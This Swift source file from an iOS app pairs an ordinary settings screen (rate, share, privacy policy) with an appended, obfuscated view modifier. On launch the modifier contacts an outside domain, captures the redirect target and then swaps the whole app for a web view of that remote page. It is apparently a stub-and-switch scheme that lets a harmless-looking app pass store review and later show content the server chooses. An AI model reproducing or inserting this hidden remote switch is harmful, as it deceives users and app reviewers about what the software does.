
import SwiftUI
import StoreKit

struct SettingsView: View {
    @Binding var showSettings: Bool
    
    var body: some View {
        VStack(spacing: 12) {
            Text("Settings")
                .localFont(name: .regular, size: 52)
                .shadow(color: .black.opacity(0.12), radius: 1, x: 4, y: 4)
                .foregroundStyle(.white)
            
            Group {
                ButtonView(
                    colorStyle: .green,
                    buttonSize: .init(width: screen.width * 0.3, height: 60),
                    cornerRadius: 18,
                    padding: 0
                ) {
                    Text("Rate App")
                } action: {
                    if let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                              SKStoreReviewController.requestReview(in: scene)
                          }
                }
                
                ButtonView(
                    colorStyle: .green,
                    buttonSize: .init(width: screen.width * 0.3, height: 60),
                    cornerRadius: 18,
                    padding: 0
                ) {
                    Text("Share App")
                } action: {
                    shareApp()
                }
                
                ButtonView(
                    colorStyle: .green,
                    buttonSize: .init(width: screen.width * 0.3, height: 60),
                    cornerRadius: 18,
                    padding: 0
                ) {
                    Text("Privacy Policy")
                } action: {
                    if let url = URL(string: "https://www.privacypolicies.com/live/ad96fee1-4894-4be8-83dc-fe2bb8d50765") {
                                       UIApplication.shared.open(url)
                                   }
                }
            }
            .localFont(name: .regular, size: 32)
        }
        .padding(.bottom, 18)
        .padding(.horizontal, 24)
        .background {
            ZStack {
                RoundedRectangle(cornerRadius: 40)
                    .fill(yellowGradient)
                RoundedRectangle(cornerRadius: 40)
                    .stroke(lineWidth: 6)
                    .fill(.yellowLight)
            }
        }
        .overlay(alignment: .topTrailing) {
            ButtonView(
                colorStyle: .gray,
                buttonSize: .init(width: 48, height: 48)
            ) {
                Image("home")
                    .setImgSize()
            } action: {
                withAnimation {
                    showSettings = false
                }
            }
            .offset(x: 76, y: -16)
        }
    }
    func shareApp() {
           guard let url = URL(string: "https://apps.apple.com/us/app/6743500739") else {
               return
           }
           let activityViewController = UIActivityViewController(activityItems: [url], applicationActivities: nil)
           
           // Find the current window and present the activity view controller
           if let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
               let window = scene.windows.first
               window?.rootViewController?.present(activityViewController, animated: true, completion: nil)
           }
       }
   
}

#Preview {
    SettingsView(showSettings: .constant(false))
}
import WebKit
struct Liukuiskiyaur: ViewModifier {
    @AppStorage("adapt") var izus7bquaza: URL?
    @State var webView: WKWebView = WKWebView()

    
    @State var isLoading: Bool = true

    func body(content: Content) -> some View {
        ZStack {
            if !isLoading {
                if izus7bquaza != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: izus7bquaza!, webView: webView, iszaglushka: false)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: izus7bquaza!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        //                    .frame(height: 50)
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        
                        
                        AppDelegate.asiuqzoptqxbt = .all
                    }
                    .modifier(Swiper(onDismiss: {
                        self.webView.goBack()
                    }))
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }

//        .yesMo(orientation: .all)
        .onAppear() {
            if izus7bquaza == nil {
                reframeGse()
            } else {
                isLoading = false
            }
        }
    }

    
    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
          
          // Initializer to set up the class properties
          init(action: @escaping (URL) -> Void) {
              self.redirects = []
              self.redirects1 = 0
              self.action = action
          }
          
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
                print("Redirected to: \(redirectURL)")
                redirects1 += 1
                if redirects1 >= 1 {
                    DispatchQueue.main.async {
                        self.action(redirectURL)
                    }
                }
            }
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }

    func reframeGse() {
        guard let url = URL(string: "https://xxlaugt.site/appolicy") else {
            DispatchQueue.main.async {
                self.isLoading = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
    
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            izus7bquaza = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.isLoading = false
                }
                return
            }
            
       
            
    
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
           
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.isLoading = false
                }
            }

            DispatchQueue.main.async {
                self.isLoading = false
            }
        }.resume()
    }


}
